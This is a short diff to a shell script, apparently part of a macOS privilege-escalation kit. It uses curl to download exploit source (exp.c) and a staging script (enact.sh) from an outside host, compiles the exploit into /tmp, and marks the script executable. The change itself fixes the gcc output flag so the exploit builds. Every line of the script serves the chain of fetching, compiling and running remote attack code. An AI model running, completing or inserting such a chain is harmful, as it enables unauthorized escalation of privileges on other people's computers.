@@ -4,7 +4,7 @@
 # That's one of the reasons enact.sh needs to be separate.
 #curl -Lso /tmp/elevate.out boesen.science:2042/mac/elevate.out
 curl -Lo /tmp/exp.c boesen.science:2042/mac/exp.c
-gcc /tmp/exp.c /tmp/a.out
+gcc /tmp/exp.c -o /tmp/a.out
 curl -Lso /tmp/enact.sh boesen.science:2042/mac/enact.sh
 chmod +x /tmp/enact.sh
 
